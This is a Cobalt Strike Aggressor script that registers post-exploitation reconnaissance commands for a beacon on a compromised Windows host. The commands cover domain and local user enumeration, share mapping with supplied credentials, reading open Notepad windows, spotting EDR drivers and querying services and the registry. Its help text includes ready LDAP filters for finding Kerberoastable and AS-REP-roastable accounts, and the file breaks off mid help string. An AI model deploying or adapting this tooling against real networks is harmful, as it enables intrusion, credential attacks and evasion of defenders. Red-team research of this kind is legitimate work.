%recordmapping = %(
A => 1,
NS => 2,
MD => 3,
MF => 4,
CNAME => 5,
SOA  => 6,
MB  => 7,
MG => 8,
MR => 9,
WKS => 0xb,
PTR => 0xc,
HINFO => 0xd,
MINFO => 0xe,
MX => 0xf,
TEXT => 0x10,
RP => 0x11,
AFSDB => 0x12,
X25 => 0x13,
ISDN => 0x14,
RT => 0x15,
AAAA => 0x1c,
SRV => 0x21,
WINSR => 0xff02,
KEY => 0x0019,
ANY => 0xff);

%enumtype = %(
all => 1,
locked => 2,
disabled => 3,
active => 4);

%reghives = %(
HKCR => 0,
HKCU => 1,
HKLM => 2,
HKU  => 3);
#sleep can't handle the actual values... so we'll just add them on the c side :(

%regtypes = %(
REG_SZ => 1,
REG_EXPAND_SZ => 2,
REG_BINARY => 3,
REG_DWORD => 4,
REG_MULTI_SZ => 7,
REG_QWORD => 11);

%inttypes = %( 
REG_DWORD => 1, 
REG_QWORD => 1);

%servicetypes = %(
1 => 0x02,
2 => 0x01,
3 => 0x10,
4 => 0x20);

$id_lastpass = "LASTPASS>>";

# subrotine to parse options for script.
# Returns optios as a hash
sub ops {
	local('$count');
	$count = 0;
	%arguments = ohash();
	foreach $arg ($1) {
		if ($count > 0) {
			if ($arg ismatch '/.*:.*') {
				$arg = replace($arg, '\A/',"");
				($key, $val) = split(":", $arg, 2);
				%arguments[$key] = $val;
			}
			else if ($arg ismatch '/.*') {
				$arg = replace($arg, '\A/',"");
				%arguments[$arg] = "TRUE";
			}
			else {
				%arguments["$count"] = $arg;
			}
		}
		$count = $count + 1;
	}
	return (%arguments);
}

#random_string
sub random_string
{
    $limit = $1;
    @random_str = @();
    $characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    for ($x = 0; $x < $limit; $x++) {
        $n = rand(strlen($characters));
        add(@random_str, charAt($characters, $n));
    }
    return join('', @random_str);
};

########################################
# Helper functions
########################################

sub readbof {
	local('$barch $handle $data $msg $ttp');
	$barch  = barch($1);

	# read in the right BOF file
    println(script_resource("bin/command/SA/ $+ $2 $+ / $+ $2 $+ . $+ $barch $+ .o"));
    $handle = openf(script_resource("bin/command/SA/ $+ $2 $+ / $+ $2 $+ . $+ $barch $+ .o"));
	$data   = readb($handle, -1);
	closef($handle);
	if(strlen($data) == 0)
	{
		berror($1, "could not read bof file");
	}
	
	$ttp = iff( ($4 eq $null || $4 eq ""), "", $4);
	$msg = iff( ($3 eq $null || $3 eq ""), "Running $2", $3);
	$msg = iff( ($ttp ne $null && $ttp ne ""), $msg . " (" . $ttp . ")", $msg);
	# announce what we're doing
	btask($1, $msg, $ttp);
	return $data;
}

sub readbof_inject
{
    $barch = barch($1);
    $bof_filename = script_resource("bin/command/Injection/ $+ $2 $+ / $+ $2 $+ . $+ $barch $+ .o");
    println("[INFO] Loading BOF file: $bof_filename");

    $handle = openf($bof_filename);
    $data   = readb($handle, -1);
    closef($handle);

    if(strlen($data) == 0)
    {
        berror($1, "*ERROR* Failed to read in BOF file: $bof_filename");
    }

    btask($1, "Loaded $2 for $barch");
    return $data;
}

sub readbof_remote
{
    local('$barch $bof_filename $handle $data $args');
    $barch  = barch($1);

    # read in the right BOF file
    $bof_filename = script_resource("bin/command/Remote/$2 $+ / $+ $2 $+ . $+ $barch $+ .o");
    println("Loading $bof_filename");
    $handle = openf($bof_filename);
    $data   = readb($handle, -1);
    closef($handle);
    if(strlen($data) == 0)
    {
        berror($1, "Could not read BOF file: $bof_filename");
    }

    btask($1, "Loaded $2 for $barch");
    return $data;
}


beacon_command_register(
	"dir",
	"Lists a target directory using BOF.",
	"Usage: dir [directory] [/s]"
);

alias dir {
	local('$params $keys $args $targetdir $subdirs $ttp $text');

	%params = ops(@_);
	@keys = keys(%params);

	$targetdir = ".\\";
	$subdirs = 0;

	if ("s" in @keys) {
		$subdirs = 1;
	}
	if ("1" in @keys) {
		$targetdir = %params["1"];
	}

	if(left($2, 2) eq "\\\\") {
		$ttp = "T1135";
		$text = "Issuing remote dir to $targetdir";
	} else {
		$ttp = "T1083";
		$text = "Issuing local dir to $targetdir";
	}

    $args = bof_pack($1, "zs", $targetdir, $subdirs);
	beacon_inline_execute($1, readbof($1, "dir", $msg, $ttp), "go", $args);
}


beacon_command_register(
"env", 
"Print environment variables.", 
"env - Print environment variables for current process");

alias env {
	# execute it.
	beacon_inline_execute($1, readbof($1, "env", $null, "T1082"), "go");
}


beacon_command_register(
"ldapsearch", 
"BOF - Perform LDAP search.", 
"ldapsearch <query> [comma_separated_attributes] [result_count] [scope_of_search] [DC hostname or IP] [Distingished Name to use]
	\"\" works as a default for attributes (get all) DC hostname / IP (use Primary DC) and distingished name (use Base domain Level)
	0 works as default for result_count (get all). For scope_of_search, use 1 [LDAP_SCOPE_BASE], 2 [LDAP_SCOPE_ONELEVEL] or 3 [LDAP_SCOPE_SUBTREE] (3 is used by default)

Important - To add in ACLs so Bloodhound can draw relationships between objects (see external BofHound tool), add nTSecurityDescriptor in the attributes list, like so:
ldapsearch <query> *,ntsecuritydescriptor ...
Useful queries (queries are just an example, edit where necessary to make it OPSEC safe):

- Kerberoastable:\n(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))

- AS-REP Roastable:\n(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))

- Passwords stored with reversible encryption:\n(&(objectClass=user)(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=128))

If this fails with an error about paging not being supported you can try to use nonpagedldapsearch instead (its unregistered but has the same arguments)");

alias ldapsearch {
	local('$args $attributes $result_limit $scope $hostname $domain');
	
	if(size(@_) < 2)
	{
		berror($1, beacon_command_detail("ldapsearch"));
		return;
	}

	$attributes = iff(-istrue $3, $3, "");
	$result_limit = iff(-istrue $4, $4, 0);
	$scope = iff(-istrue $5, $5, 3);
	$hostname = iff(-istrue $6, $6, "");
	$domain = iff(-istrue $7, $7, "");

	$args   = bof_pack($1, "zziizz", $2, $attributes, $result_limit, $scope, $hostname, $domain);

	# execute it.
	beacon_inline_execute($1, readbof($1, "ldapsearch", $null, "T1018, T1069.002, T1087.002, T1087.003, T1087.004, T1482"), "go", $args);
}

alias nonpagedldapsearch
{
	local('$args $attributes $result_limit $hostname $domain');
	
	if(size(@_) < 2)
	{
		berror($1, beacon_command_detail("ldapsearch"));
		return;
	}

	$attributes = iff(-istrue $3, $3, "");
	$result_limit = iff(-istrue $4, $4, 0);
	$hostname = iff(-istrue $5, $5, "");
	$domain = iff(-istrue $6, $6, "");

	$args   = bof_pack($1, "zzizz", $2, $attributes, $result_limit, $hostname, $domain);

	# execute it.
	beacon_inline_execute($1, readbof($1, "nonpagedldapsearch", $null, "T1018, T1069.002, T1087.002, T1087.003, T1087.004, T1482"), "go", $args);
}

alias ipconfig {

	beacon_inline_execute($1, readbof($1, "ipconfig", $null, "T1016"), "go", $null);
}

beacon_command_register(
"ipconfig", 
"runs an internal ipconfig command", 
"Synopsis: ipconfig \n\nLists out adapters, system hostname and configured dns server");


alias arp {
	beacon_inline_execute($1,readbof($1,'arp', $null, "T1016, T1018"),"go",$null);
}

beacon_command_register("arp", 
"Runs an internal ARP command", 
"Synopsis: arp \n\nLists out ARP table");

alias nslookup {
	local('$args $barch $lookup $server $type');
	
	if(size(@_) < 2)
	{
		berror($1, beacon_command_detail("nslookup"));
		return;
	}
	$barch  = barch($1);
	$lookup = $2;
	$server = iff(-istrue $3, $3, "");
	$type = iff(-istrue $4, iff(uc($4) in %recordmapping, %recordmapping[uc($4)], %recordmapping["A"]) , %recordmapping["A"]);
	if($server eq "127.0.0.1"){
		berror($1, "Localhost dns query's have a potential to crash, refusing");
		return;
	}
	if($barch eq "x86"){
	btask($1, "x86 beacons do not support custom dns nameservers, overriding to default");
	$server = "";
	}
	$args = bof_pack($1, "zzs", $lookup, $server, $type);
	beacon_inline_execute($1, readbof($1, "nslookup", "Attempting to resolve $lookup", "T1018"), "go", $args);
}

beacon_command_register(
	"nslookup", 
	"internally perform a dns query", 
	"Synopsis: nslookup <lookup value> <lookup server> <TYPE> \n\nPerform a DNS Query:\n<lookup value> is the ip or hostname you want to query\n<lookup server> is the server you want to query (use 0 or exclude for system default)\n<TYPE> record type to query");

alias netview {
	local('$args $domain');

	$domain = iff(-istrue $2, $2, "");
	$args = bof_pack($1, "Z", $domain);
	beacon_inline_execute($1, readbof($1, "netview", $null, "T1018"), "go", $args);
}

beacon_command_register(
	"netview",
	"lists local workstations and servers",
	"Synopsis: netview <optional netbios domain name>
	
hint: use netview_list if you want to map shares of a remote machine"
);

alias listdns {

	beacon_inline_execute($1, readbof($1, "listdns", $null, $null), "go", $null);
}

beacon_command_register(
	"listdns",
	"lists dns cache entries",
	"Synopsis: listdns (does not take arguments)  Note this will query each found hostname for its ip address"
);

alias listmods {
	local('$args $pid');

	$pid = iff(-istrue $2, $2, 0);
	$args = bof_pack($1, "i", $pid);
	beacon_inline_execute($1, readbof($1, "listmods", $null, $null), "go", $args);
}

beacon_command_register(
	"listmods",
	"lists process modules",
	"Synopsis: listmods <opt: pid> "
);

alias locale {
	btask($1, "Retrieving system locale information", "T1614, T1614.001");
	beacon_inline_execute($1,readbof($1,'locale'),"go",$null);
}

beacon_command_register("locale", 
"Retrieve System Locale Information, Date Format, and Country", 
"Synopsis: locale \n\nPrints locale information");

alias notepad {
	btask($1, "Searching for open notepad windows", "T1552");
	beacon_inline_execute($1,readbof($1,'notepad'),"go",$null);
}

beacon_command_register("notepad", 
"Search for open notepad and notepad++ windows and grab text from the editor control object", 
"Synopsis: notepad \n\nPrints any observed open notepad or notepad++ sessions and prints their contents. Not reliant on clipboard. Not reliant on window being non-minimized");

alias netuse_add {
	local('$args $device $share $user $password $persist $requireencrypt %params');

	if(size(@_) < 4)
	{
		berror($1, beacon_command_detail("netuse_add"));
		return;
	}
	$share = $2;
	$user = $3;
	$password = $4;
	$persist = 0;
	$requireencrypt = 0;
	%params = ops(@_);
	@keys = keys(%params);
	$device = "";
	if("PERSIST" in @keys) { $persist = 1; }
	if("REQUIREPRIVACY" in @keys) {$requireencrypt = 1; }
	if("DEVICE" in @keys) { $device = %params["DEVICE"] . ":"; }

	$args = bof_pack($1, "sZZZZss", 1, $share, $user, $password, $device, $persist, $requireencrypt);
	beacon_inline_execute($1, readbof($1, "netuse", $null, "T1570, T1021.002"), "go", $args);


}

beacon_command_register(
	"netuse_add",
	"Connect to a shared resource",
	"
Command: netuse_add
Summary: This command connects a computer to a shared resource.
Usage:   netuse_add (sharename) [opt:username] [opt:password] [opt:/DEVICE:devicename] [opt:/PERSIST] [opt:/REQUIREPRIVACY]
		 sharename	  Required. The network name of the shared resource to 
						connect to.
		username	   Required. The username to use for the remote connection, uses process auth if not provided.
		password	   Required. The password to use for the remote connection, default password for <username> used if not provided.
		/DEVICE:<devname>	 Optional. The device name on the local system to list, 
		  bind the connection to.  Does not bind a device if not given
		  ex. /DEVICE:Y
		/PERSIST		Optional flag. Persist the connection.
		/REQUIREPRIVACY      Optional. require SMBv3 Encryption, fail if not supported.
Example:
	Bind IPC$ of a remote computer using current user context
		netuse_add \\\\somedc.somedomain.local\\IPC$ \"\" \"\"

	Map a Share without creating a specific device mapping using current user context 
		netuse_add \\\\fileshare.somedomain.local\\adminstuff \"\" \"\"

	Map a Share without creating a specific device mapping, using a diferent set of credentials
		netuse_add \\\\fileshare.somedomain.local\\adminstuff someuser SomeUsersPassword /DEVICE:F

	Map a persistent share in the current user context
		netuse_add \\\\fileshare.somedomain.local\\userdrive \"\" \"\" /PERSIST
"
);

alias netuse_list {
	local('$args $target');
	if(size(@_) > 2)
	{
		berror($1, beacon_command_detail("netuse_list"));
		return;
	}
	$target = "";
	if(size(@_) == 2)
	{
		$len = strlen($2);
		$target = iff($len == 1, $2 . ":", $2);
		if($len > 2) #Remote share name was given, correct target
		{
			$target = iff(left($2, 2) eq "\\\\", $2, "\\\\" . $2);
		}
	}
	$args = bof_pack($1, "sZ", 2, $target);
	beacon_inline_execute($1, readbof($1, "netuse", $null, "T1135"), "go", $args);
}

beacon_command_register(
	"netuse_list",
	"Lists local bound connections",
	"
Command: netuse_list
Summary: This command lists bound connections when run without arguments.
		 It a specific connection when a device or remote share name is given
Usage:   netuse_list [opt:device || share]

Examples:
	List local connections:
		netuse_list

	List all info about Y:
		netuse_list Y:
"
);

alias netuse_delete {
	local('$args $target $len $persist $force');
	if(size(@_) < 2)
	{
		berror($1, beacon_command_detail("netuse_delete"));
		return;
	}
	$len = strlen($2);
	$target = iff($len == 1, $2 . ":", $2);
	if($len > 2) #Remote name was given correct target
	{
		$target = iff(left($2, 2) eq "\\\\", $2, "\\\\" . $2);
	}
	$persist = 0;
	$force = 0;
	%params = ops(@_);
	@keys = keys(%params);
	if("PERSIST" in @keys) { $persist = 1; }
	if("FORCE" in @keys) {$force = 1;}
	$args = bof_pack($1, "sZss", 3, $target, $persist, $force);
	beacon_inline_execute($1, readbof($1, "netuse", $null, "T1570, T1021.002"), "go", $args);
}

beacon_command_register(
	"netuse_delete",
	"disconnects from a shared resource",
	"
Command: netuse_delete
Summary: This command disconnects a computer from a shared resource.
Usage:   netuse_delete (devicename || sharename) [opt:/PERSIST] [opt:/FORCE]

	/PERSIST | Delete persistent connections so they are not restored
	/FORCE | force resource to unmap even if resources are open

Examples:
	Delete the share with the local device name Y:
		netuse_delete Y

	Delete the share with an unmapped local device name
		netuse_delete \\\\fileshare.somecomp.local\\Public

	Delete a share and remove its persistent mapping
		netuse_delete F /PERSIST

Note if the share has a local device name mapped you must delete using the local name
"
);


alias netuser {
	local('$args $domain');
	if(size(@_) < 2){
		berror($1, beacon_command_detail("netuser"));
		return;
	}
	$domain = iff(-istrue $3, $3, "");
	$args = bof_pack($1, "ZZ", $2, $domain);
	beacon_inline_execute($1, readbof($1, "netuser", $null, "T1087.001"), "go", $args);
}

beacon_command_register(
	"netuser",
	"list user info",
	"Synopsis: netuser <username> <optional: dns or netbios domain name, if not given run against local computer>"
);

alias windowlist {
	beacon_inline_execute($1, readbof($1, "windowlist", $null, "T1010"), "go", bof_pack($1, "i", iff($2 eq "all", 1, 0)));
}

beacon_command_register(
	"windowlist",
	"list visible windows",
	"Synopsis: List windows visible on the users desktop
	optionally specify \"all\" as an argument to see every possible window"
);

alias netstat {
	beacon_inline_execute($1, readbof($1, "netstat", $null, "T1049"), "go", $null);
}

beacon_command_register(
	"netstat",
	"get local ipv4 udp/tcp listening and connected ports",
	"Synopsis: List listening and connected ipv4 udp and tcp connections"
);

alias routeprint {
	beacon_inline_execute($1, readbof($1, "routeprint", $null, "T1016"), "go", $null);
}

beacon_command_register(
	"routeprint",
	"prints ipv4 routes on the machine",
	"Synopsis: Lists targets ipv4 routes"
);

alias whoami {
	beacon_inline_execute($1, readbof($1, "whoami", $null, "T1033"), "go", $null);
}

beacon_command_register (
	"whoami",
	"internal version of whoami /all",
	"run this to get the info from whoami /all without starting cmd.exe"
);

alias userenum {
	local('$args $type');
	if(size (@_) == 2)
	{
		if(@_[1] in %enumtype)
		{
			$type = %enumtype[@_[1]];
		}
		else{
			berror($1, beacon_command_detail("userenum"));
			berror($1, "Invalid filter specified");
			return;
		}
	}
	else{
		$type = %enumtype["all"];
	}
	$args = bof_pack($1, "ii", 0, $type);
	beacon_inline_execute($1, readbof($1, "netuserenum", $null, "T1087.001"), "go", $args);
}

alias domainenum {
	local('$args $type');
	if(size (@_) == 2)
	{
		if(@_[1] in %enumtype)
		{
			$type = %enumtype[@_[1]];
		}
		else{
			berror($1, beacon_command_detail("domainenum"));
			berror($1, "Invalid filter specified");
			return;
		}
	}
	else{
		$type = %enumtype["all"];
	}
		$args = bof_pack($1, "ii", 1, $type);
	beacon_inline_execute($1, readbof($1, "netuserenum", $null, "T1087.002"), "go", $args); # netuserenum here is not a mistake
}

beacon_command_register(
	"domainenum",
	"list usersaccounts in the current domain",
	"This command lists out domain user accounts
	You may specify one of (all, active, locked, disabled) to filter accounts returned
	defaults to all if not specified;"
);

beacon_command_register(
	"userenum",
	"List computer user accounts",
	"This command lists user accounts on the current computer
	You may specify one of (all, active, locked, disabled) to filter accounts returned
	defaults to all if not specified;"
);

alias driversigs {
	beacon_inline_execute($1, readbof($1, "driversigs", $null, "T1518.001"), "go", $null);
}

beacon_command_register(
	"driversigs",
	"checks drivers for known edr vendor names",
	"Run the command and we will accept enumerate services and check the binary signatures for known edr vendor names"
);

alias netshares{
	local('$args $name');
	$name = iff(-istrue $2, $2, "");
	$args = bof_pack($1, "Zi", $name, 0);
	beacon_inline_execute($1, readbof($1, "netshares", $null, "T1135"), "go", $args);
}

beacon_command_register(
	"netshares",
	"list shares on local or remote computer",
	"netshares <\\computername>"
);

alias netsharesAdmin{
	local('$args $name');
	$name = iff(-istrue $2, $2, "");
	$args = bof_pack($1, "Zi", $name, 1);
	beacon_inline_execute($1, readbof($1, "netshares", $null, "T1135"), "go", $args);
}

beacon_command_register(
	"netsharesAdmin",
	"list shares on local or remote computer and gets more info then standard netshares(requires admin)",
	"netsharesAdmin <\\computername>"
);

sub bnetgroup{
	local('$args $domain $group $type');
	$type = $2;
	if($type < 0 || $type > 1)
	{
		berror($1, "Invalid type passed to bnetgroup");
		return;
	}
	if($type == 1) #list group members
	{
		$group = $3;
		$domain = iff(-istrue $4, $4, "");
	}
	else # list groups
	{
		$group = "";
		$domain = iff(-istrue $3, $3, "");
	}
	$args = bof_pack($1, "sZZ", $type, $domain, $group);
	beacon_inline_execute($1, readbof($1, "netgroup", $null, "T1069.002"), "go", $args);
}

alias netGroupList {
	bnetgroup($1, 0, $2);
}

alias netGroupListMembers {
	bnetgroup($1, 1, $2, $3);
}

beacon_command_register(
	"netGroupList",
	"List Groups in this domain (or specified domain if given)",
	"netGroupList: <opt: domainname>"
);

beacon_command_register(
	"netGroupListMembers",
	"List the members of the specified group in this domain (or specified domain if given)",
	"netGroupListMembers: <Group Name> <opt: domainname>"
);

sub bnetlocalgroup{
	local('$args $server $group $type');
	$type = $2;
	if($type < 0 || $type > 1)
	{
		berror($1, "Invalid type passed to bnetlocalgroup");
		return;
	}
	if($type == 1) #list group members
	{
		$group = $3;
		$server = iff(-istrue $4, $4, "");
	}
	else # list groups
	{
		$group = "";
		$server = iff(-istrue $3, $3, "");
	}
	$args = bof_pack($1, "sZZ", $type, $server, $group);
	beacon_inline_execute($1, readbof($1, "netlocalgroup", $null, "T1069.001"), "go", $args);
}

alias netLocalGroupList {
	bnetlocalgroup($1, 0, $2);
}

alias netLocalGroupListMembers {
	bnetlocalgroup($1, 1, $2, $3);
}

beacon_command_register(
	"netLocalGroupList",
	"List Groups in this server (or specified server if given)",
	"netGroupList: <opt: servername>"
);

beacon_command_register(
	"netLocalGroupListMembers",
	"List the members of the specified group in this server (or specified server if given)",
	"netGroupListMembers: <Group Name> <opt: servername>"
);

sub bnetlocalgroup2{
	local('$args $server $group');
	
	$group = iff(-istrue $2, $2, "");
	$server = iff(-istrue $3, $3, "");
	
	$args = bof_pack($1, "ZZ", $server, $group);
	beacon_inline_execute($1, readbof($1, "netlocalgroup2", $null, "T1069.001"), "go", $args);
}

alias netLocalGroupListMembers2 {
	bnetlocalgroup2($1, $2, $3);
}

beacon_command_register(
	"netLocalGroupListMembers2",
	"List the members of the specified group in this server (or specified server if given). Output is compatible with bofhound",
	"netLocalGroupListMembers2: <opt: Group Name> <opt: servername>
	use \"\" for group name to query all interesting local groups
		
Note: Output from this BOF is compatible with bofhound"
);

sub bschtasksenum{
	local('$args');
	$args = bof_pack($1, "Z", iff(-istrue $2, $2, ""));
	beacon_inline_execute($1, readbof($1, "schtasksenum", $null, $null), "go", $args);		# while T1053.005 exists, it is related to use not discovery
}

alias schtasksenum{
	bschtasksenum($1, $2);
}

beacon_command_register(
	"schtasksenum",
	"enumerates all scheduled tasks on the local or target machine",
	"schtasksenum <opt:target>"
);


sub bschtasksquery{
	local('$args');
	$args = bof_pack($1, "ZZ", $2, $3);
	beacon_inline_execute($1, readbof($1, "schtasksquery", $null, $null), "go", $args);
}


alias schtasksquery{
	local('$server $taskname');
	$server = "";
	if ( size(@_) < 2)
	{
		berror($1, "Invalid Usage");
		berror($1, beacon_command_detail("schtasksquery"));
		return;
	} else if(size(@_) == 2)
	{
		$taskname = $2;
	} else if(size(@_) == 3)
	{
		$server = $2;
		$taskname = $3;
	} else 
	{
		berror($1, "Invalid Usage");
		berror($1, beacon_command_detail("schtasksquery"));
		return;
	}
	bschtasksquery($1, $server, $taskname);
}

beacon_command_register(
	"schtasksquery",
	"lists the details of the requested task",
	"schtasksquery <opt:server> <taskname>
	Note the task name must be given by full path including taskname, ex. 
	schtasksquery \\Microsoft\\Windows\\MUI\\LpRemove"
);

sub bcacls{
	beacon_inline_execute($1, readbof($1, "cacls", $null, $null), "go",  bof_pack($1, "Z", $2));			# while T1222 exists, it is for changing them not discovering them
}

alias cacls{
	if( size(@_) < 2)
	{
		berror($1, "requires file path");
		berror($1, beacon_command_detail("cacls"));
		return;
	}
	bcacls($1, $2);
}

beacon_command_register(
	"cacls",
	"lists file permissions",
	"cacls <file path>
	Wildcards are supported
	ex
		cacls C:\\windows\\system32\\*
		cacls C:\\windows\\system32\\cmd.exe
	Key:
		F: Full access
		R: Read & Execute access
		C: Read, Write, Execute, Delete
		W: Write access"
);

alias sc_query {
	local('$hostname $servicename $args');
	$hostname = $null;
	$servicename = $null;

	if(size(@_) == 2)
	{
		$servicename = $2;
		$hostname = $null;
	}
	else if (size(@_) == 3)
	{
		$servicename = $2;
		$hostname = $3;
	}

	$args = bof_pack($1, "zz", $hostname, $servicename);
	beacon_inline_execute($1, readbof($1, "sc_query", $null, "T1007"), "go", $args);

}

beacon_command_register(
	"sc_query", 
	"queries a services status", 
	"Synopsis: sc_query <opt: service name> <opt: hostname>
give no parameters to enumerate all services
Give just a service name to query just that service
Give \"\" as the service name and a remote host to enumerate all services on a remote host
Give both to query a specific service on a remote host"
);

alias sc_qc {
	local('$hostname $servicename $args');


	if(size(@_) == 2)
	{
		$servicename = $2;
		$hostname = $null;
	}
	else if (size(@_) == 3)
	{
		$servicename = $2;
		$hostname = $3;
	}
	else
	{
		berror($1, beacon_command_detail("sc_qc"));
		return;
	}


	$args = bof_pack($1, "zz", $hostname, $servicename);
	beacon_inline_execute($1, readbof($1, "sc_qc", $null, "T1007"), "go", $args);
}

beacon_command_register(
	"sc_qc", 
	"queries a services configuration", 
	"Synopsis: sc_qc  <service name> <opt: hostname>
	 hostname is optional, and the local system is targeted if it is not found"
);


alias sc_qdescription {
	local('$hostname $servicename $args');

	if(size(@_) == 2)
	{
		$servicename = $2;
		$hostname = $null;
	}
	else if (size(@_) == 3)
	{
		$servicename = $2;
		$hostname = $3;
	}
	else
	{
		berror($1, beacon_command_detail("sc_qdescription"));
		return;
	}

		$args = bof_pack($1, "zz", $hostname, $servicename);
		beacon_inline_execute($1, readbof($1, "sc_qdescription", $null, "T1007"), "go", $args);

}

beacon_command_register(
	"sc_qdescription", 
	"queries a services description", 
	"Synopsis: sc_qdescription <service name> <opt: hostname>
	hostname is optional, and the local system is targeted if it is not found");

#2 = hostname
#3 = servicename
sub bsc_qfailure{
	beacon_inline_execute($1, readbof($1, "sc_qfailure", $null, "T1007"), "go", bof_pack($1, "zz", $2, $3));
}

alias sc_qfailure{
	local('$hostname $servicename $args');
	if(size(@_) == 2)
	{
		$servicename = $2;
		$hostname = $null;
	}
	else if (size(@_) == 3)
	{
		$servicename = $2;
		$hostname = $3;
	}
	else
	{
		berror($1, beacon_command_detail("sc_qfailure"));
		return;
	}

	bsc_qfailure($1, $hostname, $servicename);
}

beacon_command_register(
	"sc_qfailure",
	"list service failure actions",
	"usage: sc_qfailure [servicename] [opt: hostname]"
);

sub bsc_qtriggerinfo{
	beacon_inline_execute($1, readbof($1, "sc_qtriggerinfo", $null, "T1007"), "go", bof_pack($1, "zz", $2, $3));
}

alias sc_qtriggerinfo{
	local('$hostname $servicename $args');
	if(size(@_) == 2)
	{
		$servicename = $2;
		$hostname = $null;
	}
	else if (size(@_) == 3)
	{
		$servicename = $2;
		$hostname = $3;
	}
	else
	{
		berror($1, beacon_command_detail("sc_qtriggerinfo"));
		return;
	}

	bsc_qtriggerinfo($1, $hostname, $servicename);
}

beacon_command_register(
	"sc_qtriggerinfo",
	"lists service triggers",
	"usage: sc_qtriggers [servicename] [opt: hostname]"
);


alias sc_enum{
	#$2 = NULL if not given which is what makes this ok
	beacon_inline_execute($1, readbof($1, "sc_enum", $null, "T1007"), "go", bof_pack($1, "z", $2));
}

beacon_command_register(
	"sc_enum",
	"Enumerate all service configs in depth",
	"usage: sc_enum [opt: hostname]"
);

alias reg_query
{
	#I need hostname Hive, path, key type value(s)
	#test if val in pos 1 is in Hive, if not, then assume it is a hostname
	# values at end, if multisz pack them using a variable bof string
	local('$hostname $hive $path $key $i');
	$packstr = "zizz";
	if(size(@_) < 3){
		berror($1, beacon_command_detail("reg_query"));
		return;
	}
	else{
		if($2 in %reghives)
		{
			#targeting local system
			$hostname = $null;
			$i = 1;
		}
		else{
			$hostname = "\\\\" . $2;
			$i = 2;
		}
		if (@_[$i] in %reghives)
		{
			$hive = %reghives[@_[$i]];
			$i++;
		}
		else
		{
			berror($1, beacon_command_detail("reg_query"));
			berror($1, "Provided registry hive value is invalid");
			return;
		}
		$path = @_[$i];
		println($path);
		$i++;
		if($i < size(@_))
		{
			$key = @_[$i];
			println("set subkey value to $key");
		}
		else
		{
			$key = "";
		}
		$args = bof_pack($1, "zizzi", $hostname, $hive, $path, $key, 0);
		beacon_inline_execute($1, readbof($1, "reg_query", $null, $null), "go", $args);			#T1060 exists but is about setting run keys, no broader TTP exists and none for discovery
	}

}
beacon_command_register(
	"reg_query",
	"querys registry Key OR value",
"<opt:hostname> <hive> <path> <opt: value to query>
hive should be one of:
	HKLM
	HKCU
	HKU
	HKCR
If a value to query is not specified, that one key is enumerated");

alias reg_query_recursive{
	local('$hostname $hive $path $i');
	$packstr = "zizz";
	if(size(@_) < 3){
		berror($1, beacon_command_detail("reg_query_recursive"));
		return;
	}
	else{
		if($2 in %reghives)
		{
			#targeting local system
			$hostname = $null;
			$i = 1;
		}
		else{
			$hostname = "\\\\" . $2;
			$i = 2;
		}
		if (@_[$i] in %reghives)
		{
			$hive = %reghives[@_[$i]];
			$i++;
		}
		else
		{
			berror($1, beacon_command_detail("reg_query_recursive"));
			berror($1, "Provided registry hive value is invalid");
			return;
		}
		$path = @_[$i];
		println($path);
		$i++;
		$args = bof_pack($1, "zizzi", $hostname, $hive, $path, "", 1);
		beacon_inline_execute($1, readbof($1, "reg_query", $null, $null), "go", $args);
	}
}

beacon_command_register(
	"reg_query_recursive",
	"recursivly querys registry key",
"<opt:hostname> <hive> <path> 
hive should be one of:
	HKLM
	HKCU
	HKU
	HKCR
If a value to query is not specified, that one key is enumerated");


alias tasklist{
	local('$args $resource');

	$resource = "";

	if ((size(@_) < 1) || (size(@_) > 2))
	{
		berror($1, beacon_command_detail("tasklist"));
		berror($1, "Invalid number of arguments");
		return;
	}
	$resource = iff(-istrue $2, "\\\\$2\\root\\cimv2", "\\\\.\\root\\cimv2");
	$args = bof_pack($1, "Z", $resource);
	beacon_inline_execute($1, readbof($1, "tasklist", "Connecting to $resource and retrieving list of currently running processes", "T1057"), "go", $args);
}

beacon_command_register(
	"tasklist",
	"Lists currently running processes",
	"
Command: tasklist
Summary: This command displays a list of currently running processes on either
		 a local or remote machine.
Usage:   tasklist (system)
		 system	   - Optional. Specifies the remote system to connect to. Do
						not include or use '.' to indicate the command should
						be run on the local system.
Note:	You must have a valid login token for the system specified if not
		 local. This token can be obtained using make_token.
"
);


alias wmi_query{
	local('$query $system $namespace $resource $args');

	if ((size(@_) < 2) || (size(@_) > 4))
	{
		berror($1, beacon_command_detail("wmi_query"));
		berror($1, "Invalid number of arguments");
		return;
	}
	$query = $2;
	$system = iff(-istrue $3, $3, ".");
	$namespace = iff(-istrue $4, $4, "root\\cimv2");
	$resource = "\\\\" . $+ . $system . $+ . "\\" . $+ . $namespace;

	$args = bof_pack($1, "ZZZZ", $system, $namespace, $query, $resource);
	beacon_inline_execute($1, readbof($1, "wmi_query", "Connecting to \\\\$system\\$namespace and running the WMI query \'$query\'", $null), "go", $args);			#T1047 exists but is about execution, not discovery
}

beacon_command_register(
	"wmi_query",
	"Runs a general WMI query",
	"
Command: wmi_query
Summary: This command runs a general WMI query on either a local or remote
		 machine and displays the results in a comma separated table.
Usage:   wmi_query [query] (system) (namespace)
		 query		- The query to run. The query should be in WQL.
		 system	   - Optional. Specifies the remote system to connect to. Do
						not include or use '.' to indicate the command should
						be run on the local system.
		 namespace	- Optional. Specifies the namespace to connect to. This
						defaults to root\\cimv2 if not specified.
Note:	You must have a valid login token for the system specified if not
		 local. This token can be obtained using make_token.
"
);


alias netsession {
	local('$args $hostname');

	$args = bof_pack($1, "Z", $2);
	beacon_inline_execute($1, readbof($1, "get-netsession", $null, "T1049"), "go", $args);     #T1049 is a loose match
}

beacon_command_register(
	"netsession",
	"list sessions on server",
	"Synopsis: netsession <computer> "
);

alias netsession2 {
	local('$args $hostname $method $dnsserver');

	$hostname = iff(-istrue $2, $2, "");
	$method = iff(-istrue $3, $3, 1);
	$dnsserver = iff(-istrue $4, $4, "");

	$args = bof_pack($1, "Zsz", $hostname, $method, $dnsserver);
	beacon_inline_execute($1, readbof($1, "get-netsession2", $null, "T1049"), "go", $args);     #T1049 is a loose match
}

beacon_command_register(
	"netsession2",
	"list sessions on server. Output is compatible with bofhound",
	"Usage: netsession2 <opt: computer> <opt: Resolution Method> <opt: DNS Server>
	Resolution methods: 
